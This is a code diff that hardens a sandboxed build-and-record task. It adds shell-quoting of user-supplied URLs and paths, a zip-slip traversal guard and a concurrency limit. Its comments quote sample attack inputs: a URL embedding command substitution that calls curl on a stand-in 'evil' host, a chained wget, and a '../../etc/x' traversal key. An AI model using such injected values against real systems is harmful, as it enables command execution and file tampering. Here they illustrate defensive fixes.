@@ -11,6 +11,16 @@ const SUPABASE_OPTS = {
   realtime: { transport: ws as unknown as never },
 } as const;
 
+// Single-quote a value so it is always exactly ONE shell argument, regardless of
+// metacharacters. User-derived strings (repo URL, live URL, zip file paths) flow
+// into sandbox.commands.run, which executes them via a shell; without this a value
+// like `https://x/$(curl evil)` or `repo;wget…` would run command substitution /
+// chained commands inside the sandbox. Embedded single quotes are closed, escaped
+// and reopened ('\'') so the wrapping itself can't be broken out of.
+function shQuote(value: string): string {
+  return `'${String(value).replace(/'/g, `'\\''`)}'`;
+}
+
 export type BuildPayload = {
   projectId: string;
   sourceType: "github" | "zip" | "live_url";
@@ -141,6 +151,11 @@ function parseRecorderMeta(stdout: string): RecorderMeta {
 export const buildAndRecord = task({
   id: "build-and-record",
   maxDuration: 1200,
+  // Cost ceiling: each run spins up an E2B sandbox + Anthropic computer-use calls.
+  // A global concurrency cap means even a flood of triggers (re-record spam, mass
+  // signups) can never run more than this many paid sandboxes at once — the rest
+  // queue. Pair this with the per-project debounce on the trigger side.
+  queue: { name: "demo-builds", concurrencyLimit: 3 },
   catchError: async ({ payload, error, ctx }) => {
     const buildPayload = payload as BuildPayload;
     logger.error("Build job failed", {
@@ -177,8 +192,10 @@ export const buildAndRecord = task({
 
       if (payload.sourceType === "github") {
         const repoUrl = payload.sourceValue;
+        // repoUrl is already a reconstructed clean github URL (lib/demoSource), but
+        // shell-quote at the sink too so the command can never be broken out of.
         const clone = await sandbox.commands.run(
-          `git clone --depth 1 ${repoUrl} ${repoPath}`,
+          `git clone --depth 1 ${shQuote(repoUrl)} ${shQuote(repoPath)}`,
           { timeoutMs: CLONE_TIMEOUT_MS },
         );
         logger.log("git clone done", { exitCode: clone.exitCode });
@@ -200,9 +217,23 @@ export const buildAndRecord = task({
           throw new Error(`No files found under storage prefix '${prefix}'`);
         }
 
-        await sandbox.commands.run(`mkdir -p ${repoPath}`);
+        await sandbox.commands.run(`mkdir -p ${shQuote(repoPath)}`);
         for (const storagePath of filePaths) {
           const relative = storagePath.slice(prefix.length + 1); // strip "{prefix}/"
+          // zip-slip guard: a crafted upload could carry object keys like
+          // `../../etc/x`. Keep every written file strictly inside repoPath so a
+          // traversal entry can't escape the build dir or clobber sandbox files.
+          const segs = relative.split("/");
+          if (
+            !relative ||
+            relative.startsWith("/") ||
+            relative.includes("\\") ||
+            relative.includes("\0") ||
+            segs.some((s) => s === "..")
+          ) {
+            logger.log("skipping unsafe zip path", { relative });
+            continue;
+          }
           const { data, error } = await supabaseDl.storage
             .from(DEMO_BUCKET)
             .download(storagePath);
@@ -214,7 +245,7 @@ export const buildAndRecord = task({
           const targetPath = `${repoPath}/${relative}`;
           const targetDir = targetPath.substring(0, targetPath.lastIndexOf("/"));
           if (targetDir && targetDir !== repoPath) {
-            await sandbox.commands.run(`mkdir -p '${targetDir}'`);
+            await sandbox.commands.run(`mkdir -p ${shQuote(targetDir)}`);
           }
           await sandbox.files.write(targetPath, data);
         }
@@ -302,8 +333,12 @@ export const buildAndRecord = task({
       computerUse: Boolean(recordEnvs.ANTHROPIC_API_KEY),
     });
 
+    // recordTarget is either a fixed localhost URL (github/zip) or the user's
+    // live_url, which can legitimately contain shell metacharacters in its query
+    // string — quote it so it reaches the recorder as a single argv, never a
+    // command. The recorder validates the protocol again before navigating.
     const recordResult = await sandbox.commands.run(
-      `${RECORD_PREFIX}mkdir -p /tmp/rec && node /tmp/record-helper.js ${recordTarget} /tmp/rec ${RECORD_DURATION_SEC}`,
+      `${RECORD_PREFIX}mkdir -p /tmp/rec && node /tmp/record-helper.js ${shQuote(recordTarget)} /tmp/rec ${RECORD_DURATION_SEC}`,
       { timeoutMs: RECORD_TIMEOUT_MS, envs: recordEnvs },
     );
     logger.log("record done", {
